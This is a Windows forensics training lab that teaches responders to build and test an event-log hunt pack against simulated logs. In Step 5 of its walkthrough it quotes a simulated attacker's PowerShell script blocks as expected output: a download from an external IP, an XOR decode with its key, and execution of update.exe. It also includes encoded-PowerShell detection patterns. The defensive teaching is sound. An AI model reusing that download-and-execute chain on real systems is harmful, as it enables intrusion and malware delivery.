# Lab 09 — Windows Event Logs

**Supporting [Chapter 9: Windows Event Logs](../../Book/Chapter09.md)**
*Windows Forensics for Beginners: A Practical Guide for Incident Responders*

---

## Overview

Windows event logs are some of the most useful and most frustrating evidence sources in incident response.

They can show logons, failed authentication attempts, service creation, scheduled task activity, PowerShell execution, Defender detections, and application-specific behavior. They can also bury you in noise, overwrite the events you care about, and vary wildly depending on how the host was configured before the incident started.

Effective event-log work in IR is therefore usually not about clicking through Event Viewer. It is about knowing which logs matter, which patterns to hunt first, and how to build reusable filters that let you move quickly when a new case starts.

This lab focuses on building a reusable event log hunt pack. You will collect key logs from a Windows VM, define suspicious patterns, and turn those patterns into saved searches or filter logic. You will then test them with lab-generated events and package the results so you can reuse them and share them with your team.

The goal is a repeatable event-log workflow you can carry into future investigations, not just one suspicious event found today.

---

## What This Lab Covers

This lab supports the following sections from Chapter 9:

| Section | Topic |
|---|---|
| 9.1 | Log Types |
| 9.2 | Challenges |
| 9.3 | Approach |

---

## Learning Objectives

By completing this lab, you will be able to:

- Identify the Windows event logs most useful for incident response
- Explain the strengths and limitations of Security, System, Application, and Microsoft-Windows operational logs
- Recognize common challenges such as noise, retention limits, time skew, and incomplete logging
- Define suspicious event patterns worth hunting first
- Create reusable filters or saved searches for those patterns
- Test your filters against lab-generated events
- Package your filters and documentation into a reusable hunt pack

---

## Estimated Time and Difficulty

**Difficulty:** Intermediate

**First time through the material:** 3–4 h

**Refresh (already familiar with the chapter):** 75–105 min

> **Key terms used in this lab:** Security log, Operational log, EID 4624/4625/4648/4688, Sigma rule, hunt pack. See the consolidated [Glossary](../../Book/Glossary.md) for definitions. The chapter cross-references in each entry take you back to the deeper coverage in `Book/`.

---

## Prerequisites

- Completion of Labs 01–08, or equivalent familiarity with Windows IR workflow, timelines, and core Windows artifacts
- A text editor or markdown editor
- Your `lab09-notes.md` file
- A Windows lab VM
- Access to Event Viewer, PowerShell, or a log-export method
- Optional: tools such as EvtxECmd, Windows Event Forwarding, or a SIEM / log platform

> **Working without a VM:** Parsed `.evtx` output for the WKSTN-221 scenario is in [`Data/WKSTN-221/`](../../Data/WKSTN-221/) (`security-evtx.csv`, `system-evtx.csv`, `powershell-evtx.csv`). Use these as the input for filter and hunt-pack development if you are not exporting your own logs.

> **Prerequisite outputs from earlier labs (optional but helpful):** This lab uses the same WKSTN-221 host you've already analyzed disk-side in [Lab 04](../Lab04/ReadMe.md). The execution events you'll find here (4688 spawns of `cmd.exe`, `powershell.exe`, `update.exe`) and the MFT / Prefetch / Amcache findings from Lab 04 reinforce each other. The hunt pack you build in this lab then feeds the merged timeline in [Lab 10](../Lab10/ReadMe.md).

---

## Scenario

Your team wants a reusable way to spot suspicious behavior across Windows logs during the early stages of an investigation.

Instead of starting from scratch every time, you have been asked to build a Windows event log hunt pack that focuses on high-value patterns such as:

- Multiple failed logons followed by a success
- Service installation or suspicious service activity
- Scheduled task creation or modification
- PowerShell activity from unusual locations or with suspicious behavior

Your task is to collect key logs, define suspicious patterns, write reusable filter definitions, test them by generating events in the lab, and package the finished material so it can be reused and shared.

---

## Background: Event Logs Are Powerful but Imperfect

Windows exposes many useful logs, but not all are equally valuable during incident response.

The most important families introduced in this chapter are:

| Log Type | Common IR Use |
|---|---|
| Security | Logons, authentication failures, privilege use, account changes, object access if enabled |
| System | Services, driver issues, system state changes, startup/shutdown events |
| Application | App-specific warnings, crashes, and behaviors |
| Microsoft-Windows-Operational logs | PowerShell, Task Scheduler, Defender, and other feature-specific activity |

Logs are also rarely perfect.

| Challenge | Why It Matters |
|---|---|
| Volume and noise | Important events can be buried in normal activity |
| Retention limits / overwrite | The events you care about may already be gone |
| Time skew | Comparing events across systems can be misleading if clocks differ |
| Incomplete logging | Important event IDs may never have been enabled |

Responders therefore usually start with known-good filters and repeatable parsing workflows instead of raw manual review.

> **IR Reality Check:** Event logs are often strongest when they answer a narrow question clearly. Good filters are what make that possible.

---

## Lab Tasks

---

### Task 1 — Identify the Key Log Types for IR

**Objective:** Build a practical understanding of the event log families that matter most.

Fill in the table below.

| Log Type | What It Commonly Contains | Why It Matters in IR | Limitation |
|---|---|---|---|
| Security | | | |
| System | | | |
| Application | | | |
| Microsoft-Windows-PowerShell / Operational | | | |
| Microsoft-Windows-TaskScheduler / Operational | | | |
| Microsoft-Windows-Windows Defender / Operational | | | |

Then answer:

1. Why is the Security log often the first place responders look?

2. Why are Operational logs often more useful than the general Application log for focused hunting?

3. Why should responders know which logs were enabled before trusting the absence of evidence?

---

### Task 2 — Identify the Main Challenges in Event Log Analysis

**Objective:** Learn why event logs require structured hunting instead of ad hoc browsing.

Fill in the table below.

| Challenge | Why It Happens | Why It Matters | How You Would Mitigate It |
|---|---|---|---|
| Volume and noise | | | |
| Retention limits / overwrite | | | |
| Time skew | | | |
| Incomplete logging configuration | | | |

Add at least four more challenges of your own.

Then answer:

1. Why can noisy logs be just as dangerous as missing logs?

2. Why is time normalization important before building timelines?

3. Why is "nothing suspicious in the logs" often a weaker conclusion than it sounds?

---

### Task 3 — Collect Security and PowerShell Logs

**Objective:** Gather the core log sources for the hunt pack.

Export at least the following from your lab VM:

- Security.evtx
- PowerShell-related logs, such as PowerShell Operational logs if available

Record your collection details below.

| Field | Value |
|---|---|
| Host / VM Name | |
| Logs Exported | |
| Export Method | |
| Output Folder | |
| Collection Date/Time (UTC) | |
| Notes / Issues | |

Then answer:

1. Why is exporting the raw `.evtx` useful even if you also parse the logs later?

2. Why should the source host and collection time be documented?

3. Why might you also want System or Task Scheduler logs in the same hunt pack?

---

### Task 4 — Define Suspicious Event Patterns

**Objective:** Identify the patterns your hunt pack should detect.

Using the chapter guidance, define at least eight suspicious or high-value patterns to hunt for.

At minimum, include:

- Multiple failed logons followed by a success
- Service installation or service creation
- PowerShell execution from unusual locations
- Scheduled task creation or modification

Use the table below.

| Suspicious Pattern | Why It Matters | Primary Log(s) | What It Might Suggest |
|---|---|---|---|
| Multiple failed logons followed by a success | | | |
| Service installation / creation | | | |
| PowerShell execution from unusual locations | | | |
| Scheduled task creation or modification | | | |

Add at least four more patterns of your own.

Examples you may choose:

- Privilege escalation or special logon activity
- Local account changes
- Defender detections or exclusions
- Log clearing
- New service start after installation
- Remote logon activity
- Script block logging with encoded or suspicious content

Then answer:

1. Why should hunt-pack patterns focus on responder value rather than every possible event ID?

2. Why are event patterns usually stronger than single isolated events?

3. Why should patterns be tied to specific IR questions?

---

### Task 5 — Map Patterns to Filters or Saved Searches

**Objective:** Convert suspicious patterns into reusable search logic.

For each suspicious pattern, define a reusable filter or search.

You may express this as:

- SIEM logic
- Event Viewer XML filter logic
- EvtxECmd / parser-driven filter logic
- PowerShell filtering logic
- Pseudocode if needed

Use the table below.

| Suspicious Pattern | Filter / Search Definition | Tool or Platform | Why This Filter Is Useful |
|---|---|---|---|
| Multiple failed logons followed by a success | | | |
| Service installation / creation | | | |
| PowerShell execution from unusual locations | | | |
| Scheduled task creation or modification | | | |

Add at least four more of your own.

Then answer:

1. Why is filter logic more reusable than freeform manual hunting?

2. Why should filters be documented in plain language as well as technical syntax?

3. Why is it useful to record which tool or platform each filter was designed for?

---

### Task 6 — Build the Hunt Pack Documentation File

**Objective:** Create the markdown documentation that explains the hunt pack.

Create a markdown file such as:

- `hunt-pack.md`

Document each hunt in a structured way.

Use this format for at least six hunts:

- Hunt Name:
- Purpose:
- Primary Log(s):
- Primary Event IDs / Patterns:
- Filter Logic:
- What a Positive Hit Might Mean:
- Common False Positives:
- Follow-Up Artifacts:

Then answer:

1. Why is false-positive guidance important in a reusable hunt pack?

2. Why should follow-up artifacts be included in the documentation?

3. Why is this documentation as important as the filters themselves?

---

### Task 7 — Generate Test Events in the Lab

**Objective:** Validate that the filters work against real events.

Generate test activity in your lab VM that should trigger some of your hunts.

Examples from the chapter include:

- Failed logons
- A successful logon after failures
- Scheduled task creation
- PowerShell activity
- Service creation or start

Record at least six test events or test actions.

| Test Action | Expected Log Pattern | Approximate Time (UTC) | Which Hunt Should Catch It |
|---|---|---|---|
| Failed logon attempts | | | |
| Successful logon after failures | | | |
| Scheduled task creation | | | |
| PowerShell execution | | | |

Add at least two more actions of your own.

Then answer:

1. Why is it important to test hunts against known lab actions?

2. Why should you record approximate timestamps of your test activity?

3. Why is a hunt pack incomplete if it has never been validated?

---

### Task 8 — Test and Refine the Filters

**Objective:** Confirm that the hunts detect expected activity and adjust them if needed.

Run your filters or saved searches against the exported logs or your SIEM / parser output.

Document the results below.

| Hunt Name | Expected Hit? | Actual Result | Adjustment Needed? | Notes |
|---|---|---|---|---|
| | | | | |
| | | | | |
| | | | | |
| | | | | |
| | | | | |

Then answer:

1. Why is filter tuning part of the DFIR workflow, not a sign of failure?

2. Why can a technically correct filter still be operationally weak?

3. Why should you note both successful detections and misses?

---

### Task 9 — Package the Hunt Pack for Reuse

**Objective:** Organize the filters and documentation into a reusable bundle.

Create a reusable folder structure for your hunt pack.

Use or adapt this model:

```
Windows-EventLog-HuntPack/
├── README.md
├── hunt-pack.md
├── filters/
│   ├── security/
│   ├── powershell/
│   ├── system/
│   └── taskscheduler/
├── sample-logs/
└── test-notes/
```

Then define naming conventions for:

| Item | Naming Convention | Example |
|---|---|---|
| Filter file | | |
| Hunt documentation section | | |
| Test note | | |
| Sample exported log | | |

Afterward, answer:

1. Why is a reusable folder structure important if you want to share the hunt pack with a team?

2. Why should sample logs or test notes be included when possible?

3. Why does packaging matter almost as much as the hunt logic itself?

---

### Task 10 — Separate Strong Support from Overclaims

**Objective:** Practice disciplined language around event-log hunts.

Classify each statement below as:

- Strongly supported
- Suggested but needs corroboration
- Not supported by these events alone

| Statement | Classification | Why |
|---|---|---|
| The host recorded multiple failed logons followed by a success | | |
| A service-installation-related event occurred | | |
| PowerShell activity from an unusual path deserves deeper review | | |
| The attacker definitely gained interactive control of the host | | |
| A scheduled task was created or modified | | |
| The new task was definitely used for persistence by malware | | |
| The hunt pack successfully identified suspicious patterns worth follow-up | | |
| Event logs alone prove the full scope of the incident | | |

Then write six additional statements of your own and classify them the same way.

> **Guidance:** Event logs are excellent for spotting patterns and building leads. They still need host, timeline, and execution correlation for stronger conclusions.

---

### Task 11 — Write an Event Log Hunt Pack Summary

**Objective:** Produce a concise working-note summary suitable for the case file or team handoff.

Write a 3–5 paragraph analyst summary describing:

- Which logs you collected
- Which suspicious patterns your hunt pack focuses on
- Which test events you generated and whether the hunts caught them
- What the hunt pack is designed to detect well
- What still requires other artifacts or deeper analysis

Write it as a practical working-note summary.

---

### Task 12 — Write an Analyst Handoff Note

**Objective:** Make your hunt pack easy for another responder to use and improve.

Use the template below.

```
Case Reference:
Author:
Date/Time (UTC):

Logs Collected:
- 

Most Important Hunt Patterns:
- 

Filters That Worked Well:
- 

Filters That Need Tuning:
- 

Recommended Next Steps:
1.
2.
3.

Open Questions:
- 

Notes for Incoming Analyst:
```

---

### Task 13 — Reflection

Answer the following in 3–5 sentences each.

**1. Why hunt packs matter**
Why is a reusable hunt pack more valuable than starting from scratch in every Windows incident?

**2. Pattern hunting versus raw review**
Why are event-log patterns usually more useful than isolated single-event review?

**3. Validation matters**
Why should responders test their filters instead of assuming they work because the logic looks correct?

**4. Correlation remains essential**
Why do event-log hits become much stronger when paired with execution artifacts, Registry data, NTFS, or network evidence?

---

## Hands-On Walkthrough (Using Simulated Data)

This walkthrough builds a working hunt pack against the pre-parsed event log data in [`Data/WKSTN-221/`](../../Data/WKSTN-221/). The format mirrors what `EvtxECmd` produces, so every PowerShell example below works against the CSVs directly. If you have your own `.evtx` files, run `EvtxECmd.exe -d <log_dir> --csv <out_dir>` first and substitute the resulting paths.

### Step 1 — Load the security log

```powershell
$sec = Import-Csv 'Data\WKSTN-221\security-evtx.csv'
$sec.Count
```

```python
import csv
with open('Data/WKSTN-221/security-evtx.csv') as f:
    sec = list(csv.DictReader(f))
print(len(sec))
```

Expected: 38 rows. Take a quick look at the event-ID distribution:

```powershell
$sec | Group-Object EventID | Sort-Object Count -Descending | Select-Object Count, Name
```

```python
from collections import Counter
counts = Counter(r['EventID'] for r in sec)
for eid, n in counts.most_common():
    print(n, eid)
```

Expected: 4688 (process creation) is the most common, followed by 4624 (logon), 4625 (failed logon), 4634/4672, etc.

### Step 2 — Filter for failed-logon-followed-by-success patterns

```powershell
# Failed logons grouped by source IP
$sec | Where-Object { $_.EventID -eq "4625" } |
       ForEach-Object {
           $ip = ($_.Payload | Select-String -Pattern 'IpAddress=([\d.]+)').Matches[0].Groups[1].Value
           [PSCustomObject]@{ Time=$_.TimeCreated; SourceIP=$ip; Account=($_.Payload | Select-String -Pattern 'TargetUserName=(\S+)').Matches[0].Groups[1].Value }
       } |
       Group-Object SourceIP | Where-Object Count -ge 3 |
       Select-Object Count, Name
```

```python
import re
ips = []
for r in sec:
    if r['EventID'] == "4625":
        m = re.search(r'IpAddress=([\d.]+)', r['Payload'])
        if m:
            ips.append(m.group(1))
for ip, n in Counter(ips).items():
    if n >= 3:
        print(n, ip)
```

Expected: one group, `185.193.126.47`, count 4. That group is the password-spray pattern around 04:00 UTC, and this filter is one of the canonical hunt-pack filters from §9.3.1.

### Step 3 — Filter for explicit-credential lateral movement

```powershell
$sec | Where-Object { $_.EventID -eq "4648" } |
       Select-Object TimeCreated, UserName,
                     @{N='Target';E={($_.Payload | Select-String -Pattern 'TargetServerName=(\S+)').Matches[0].Groups[1].Value}}
```

```python
for r in sec:
    if r['EventID'] == "4648":
        m = re.search(r'TargetServerName=(\S+)', r['Payload'])
        target = m.group(1) if m else ''
        print(r['TimeCreated'], r['UserName'], target)
```

Expected: one row, `payroll-admin → FILESVR-03` at 14:33:18. EID 4648 from a finance workstation targeting a file server is a strong lateral-movement signal.

### Step 4 — Suspicious process creation chain

```powershell
$sec | Where-Object { $_.EventID -eq "4688" -and $_.Payload -like "*EncodedCommand*" } |
       Select-Object TimeCreated, UserName, Payload
```

```python
for r in sec:
    if r['EventID'] == "4688" and 'EncodedCommand' in r['Payload']:
        print(r['TimeCreated'], r['UserName'], r['Payload'])
```

Expected: one row, `powershell.exe` spawned by `OUTLOOK.EXE` at 14:19:38 with an `-EncodedCommand` argument. Decoded, the base64 string in the `CommandLine` field reveals the Invoke-WebRequest cradle.

### Step 5 — Decode the EID 4104 script blocks

```powershell
$ps = Import-Csv 'Data\WKSTN-221\powershell-evtx.csv'
$ps | Where-Object { $_.EventID -eq "4104" -and $_.TimeCreated -gt "2024-11-14 12:00" } |
      Select-Object TimeCreated,
                    @{N='Script';E={($_.Payload | Select-String -Pattern 'ScriptBlockText=(.+?) ScriptBlockId').Matches[0].Groups[1].Value}}
```

```python
with open('Data/WKSTN-221/powershell-evtx.csv') as f:
    ps = list(csv.DictReader(f))
for r in ps:
    if r['EventID'] == "4104" and r['TimeCreated'] > "2024-11-14 12:00":
        m = re.search(r'ScriptBlockText=(.+?) ScriptBlockId', r['Payload'])
        script = m.group(1) if m else ''
        print(r['TimeCreated'], script)
```

Expected: four script-block rows showing successively:
1. `Invoke-WebRequest -Uri 'https://91.214.47.22/h/u.t' -OutFile $env:TEMP\a.tmp`
2. The XOR decoder loop with key `F1nd4nc3K3y!`
3. `Move-Item ... -Force`
4. `Start-Process $env:TEMP\update.exe`

That sequence is the entire attacker payload: download, decode, rename, execute. Without Script Block Logging enabled, the `-EncodedCommand` from Step 4 alone is opaque.

### Step 6 — Build a saved filter

Now turn what you found into a reusable function. Save the following to your hunt pack:

```powershell
function Find-EncodedPowerShell {
    param([string]$CsvPath)
    Import-Csv $CsvPath |
        Where-Object { $_.EventID -eq "4688" -and $_.Payload -match 'EncodedCommand|FromBase64String|IEX' } |
        Select-Object TimeCreated, UserName,
            @{N='Cmdline';E={($_.Payload | Select-String -Pattern 'CommandLine=(.+)$').Matches[0].Groups[1].Value}}
}
Find-EncodedPowerShell -CsvPath 'Data\WKSTN-221\security-evtx.csv'
```

```python
def find_encoded_powershell(csv_path):
    with open(csv_path) as f:
        for r in csv.DictReader(f):
            if r['EventID'] == "4688" and re.search(r'EncodedCommand|FromBase64String|IEX', r['Payload']):
                m = re.search(r'CommandLine=(.+)$', r['Payload'])
                print(r['TimeCreated'], r['UserName'], m.group(1) if m else '')
find_encoded_powershell('Data/WKSTN-221/security-evtx.csv')
```

The function is now a reusable filter that runs against any EvtxECmd CSV. Build a few more for failed-then-success logons, EID 7045 service installs with non-standard image paths, and EID 4698 scheduled-task creation. The result is a hunt pack rather than a one-off analysis.

### Step 7 (Optional) — Test Against Real EVTX from EVTX-to-MITRE-Attack

The simulated WKSTN-221 data is small and bounded. Before declaring a hunt-pack filter "done," run it against real Windows event logs known to contain attacker activity. The [EVTX-to-MITRE-Attack](https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack) project (CC0 public domain) ships 270+ real `.evtx` files, each labeled with the MITRE ATT&CK technique it captures.

```powershell
# 1. Clone the project somewhere convenient
git clone https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack.git C:\Datasets\evtx-mitre

# 2. Pick a technique relevant to your filter. Example: T1059.001 — PowerShell.
# Parse all .evtx in that technique folder into CSV.
EvtxECmd.exe -d 'C:\Datasets\evtx-mitre\Execution\T1059.001 - Powershell' --csv 'C:\Cases\evtx-mitre\T1059.001\'

# 3. Run your Find-EncodedPowerShell function against the parsed CSV.
Find-EncodedPowerShell -CsvPath 'C:\Cases\evtx-mitre\T1059.001\<EvtxECmd-output-file>.csv'
```

If your filter fires against the real-world EVTX, your hunt pack has demonstrated value beyond the synthetic test set. If it does not, and the technique folder shows the activity does happen in real logs, your filter has a coverage gap. That gap is the next thing to fix.

The dataset also lets you **measure environmental telemetry coverage**. Walk through the technique folders, identify the events the dataset captures, and check whether your environment's audit policy and log forwarding surface them. Missing events almost always mean missing audit-policy configuration, not missing attacks, and you can find that gap before an incident.

### Step 8 (Optional) — Run Hayabusa for a Sigma-Rule-Based Cross-Check

The hand-built filters in Steps 2–6 are tailored to the WKSTN-221 scenario and will not catch every attacker pattern in real EVTX. A complementary approach is to run [Hayabusa](https://github.com/Yamato-Security/hayabusa) (Yamato Security, AGPL-3.0). This fast, Rust-based tool applies 4,000+ Sigma rules and 170+ built-in detections against `.evtx` files and emits a single CSV mapped to MITRE ATT&CK techniques.

```powershell
# Download the latest Hayabusa release (or use winget / git clone), then:
hayabusa.exe update-rules

# Run against the simulated WKSTN-221 EVTX collection. (If you only have the
# pre-parsed CSVs from this Data/ folder, run against your own VM's logs
# under %SystemRoot%\System32\winevt\Logs\ instead.)
hayabusa.exe csv-timeline -d C:\Triage\WKSTN-221\Logs `
  -o C:\Cases\WKSTN-221\hayabusa.csv -p super-verbose
```

Open the resulting CSV in Timeline Explorer (Eric Zimmerman) or any spreadsheet. Each row is a single detection: timestamp, computer, channel, EID, Sigma rule name, severity (informational / low / medium / high / critical), and the MITRE ATT&CK technique IDs the rule maps to.

For repeatable runs across cases, [HayabusaAutorun](https://github.com/zach115th/HayabusaAutorun) is a PowerShell wrapper that handles rule updates, timestamped output folders, multi-format export (CSV / Timesketch / JSONL), and optional [Takajo](https://github.com/Yamato-Security/takajo) parsing. It is useful once Hayabusa becomes part of your standard workflow rather than a one-off.

**How this complements your hand-built filters:** the filters from Steps 2–6 are specific and narrow. They fire deterministically on the patterns they target and tell you what activity matches a known shape. Hayabusa is broad and driven by its pattern library, so it surfaces activity you didn't think to look for. Real hunt packs use both: narrow filters for known-good patterns, plus a broad Sigma scan as a backstop.

### What you've just done

You have built and tested filters for password spray, explicit-credential lateral movement, encoded PowerShell, and Script Block Logging content extraction, using CSV output of the type EvtxECmd produces. Walk back through Tasks 1–10 above and complete the hunt-pack documentation with the filters you've just verified. If you ran Step 7, you also have a sanity check that those filters work against real attacker EVTX, not just the synthetic dataset. If you ran Step 8, you have a Sigma-rule baseline running alongside your hand-built filters, which serves as a regression check for every future case.

---

## Deliverables Checklist

Your `lab09-notes.md` should contain:

- [ ] **Task 1** — Key log-type table with written responses
- [ ] **Task 2** — Event-log challenge table with added challenges
- [ ] **Task 3** — Log-collection record
- [ ] **Task 4** — Suspicious-pattern table with at least eight patterns
- [ ] **Task 5** — Filter / saved-search definition table
- [ ] **Task 6** — Hunt-pack markdown structure for at least six hunts
- [ ] **Task 7** — Test-event table with at least six actions
- [ ] **Task 8** — Filter-testing and tuning table
- [ ] **Task 9** — Hunt-pack packaging structure and naming conventions
- [ ] **Task 10** — Strong support vs overclaim exercise
- [ ] **Task 11** — Event Log Hunt Pack summary
- [ ] **Task 12** — Analyst handoff note
- [ ] **Task 13** — Reflection answers (3–5 sentences each)

---

## Files in This Folder

```
Lab09/
├── ReadMe.md                                   ← This file
├── lab09-notes.md                              ← Your working notes file
├── walkthrough-answers.md                      ← Sample answers for the
│                                                  Hands-On Walkthrough
├── task-answers.md                             ← Sample answers for the
│                                                  reflective workbook Tasks
└── Lab09_03/hunt-pack-scaffold.md              ← Reusable hunt-pack template
                                                   (copy into your team's
                                                   shared hunt-packs folder)
```

---

> **Going deeper:** `Book/AppendixA.md` (Lateral Movement, Credential Abuse, and Active Directory) covers lateral-movement-specific event IDs (4624 LogonType 3/10, 4648, 4768/4769/4771/4776, 4720/4728/4732/4756). It adds the source, destination, and domain-side correlation patterns that turn individual EID hits into defensible findings.

---

## Key Takeaways

- **Event logs are most useful when hunted with intent.** Known-good filters and repeatable patterns beat raw browsing under pressure.
- **Different log families answer different questions.** Security, System, Application, and Operational logs each contribute differently.
- **Noise and incompleteness are normal.** Good responders design hunts that tolerate imperfect logging.
- **Validation matters.** A hunt pack is only useful if it catches known test activity and is refined over time.
- **Packaging improves operational value.** A hunt pack becomes far more useful when it is documented, structured, and shareable.

---

**Next:** Lab 9.1 — Log Types

*Part of the [Windows Forensics for Beginners](https://github.com/zach115th/Windows-Forensics-for-Beginners) lab series.*
